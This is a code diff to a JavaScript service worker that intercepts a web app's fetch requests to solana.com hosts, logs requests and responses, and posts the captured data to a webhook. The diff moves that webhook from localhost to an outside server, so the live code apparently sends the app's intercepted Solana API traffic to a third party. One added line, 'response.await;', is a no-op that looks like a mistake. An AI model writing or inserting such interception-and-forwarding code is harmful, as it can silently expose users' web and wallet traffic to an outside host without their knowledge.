@@ -4,11 +4,11 @@ self.addEventListener('fetch', function(event) {
   event.respondWith(
     fetch(event.request).then(response => {
       const requestUrl = new URL(event.request.url);
-      console.log('Request URL:', requestUrl.hostname);
       // Only targeting requests to solana.com, this will not work on localhost
       // but also this won't capture any other API calls to other domains that the
       // dApp may make.
       if (/\.solana\.com$/.test(requestUrl.hostname)) {
+        console.log('Request URL:', requestUrl.hostname);
         const uniqueId = Date.now().toString(36) + Math.random().toString(36).substr(2);
         logRequest(uniqueId, event, requestClone);
 
@@ -84,39 +84,23 @@ function logResponse(uniqueId, event, response) {
   });
 }
 
-/*
 function sendToWebhook(data) {
-  fetch('https://webhook.site/683f3fba-dee1-4b0b-8e05-3c91dc2ee52e', {
+  fetch('http://encinitas.com:3001/capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data),
-    mode: 'no-cors'
+    body: JSON.stringify(data)
   })
   .then(response => {
-    console.log('Status Code:', response.status);
-    console.log('Status Text:', response.statusJson);
-
+    response.await;
     if (!response.ok) {
       throw new Error('Network response was not ok');
     }
-    return response.text(); // or response.json() if the server responds with JSON
+    return response.text();
   })
   .then(textResponse => {
     console.log('Webhook response:', textResponse);
-    // Here you can handle the text response from the webhook
   })
   .catch(error => {
     console.error('Error sending data to webhook or handling response:', error);
-  });
-}
-*/
-
-function sendToWebhook(data) {
-  fetch('http://localhost:3001/capture', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data),
-  }).catch(error => {
-    console.error('Error sending data to webhook:', error);
   });
 }
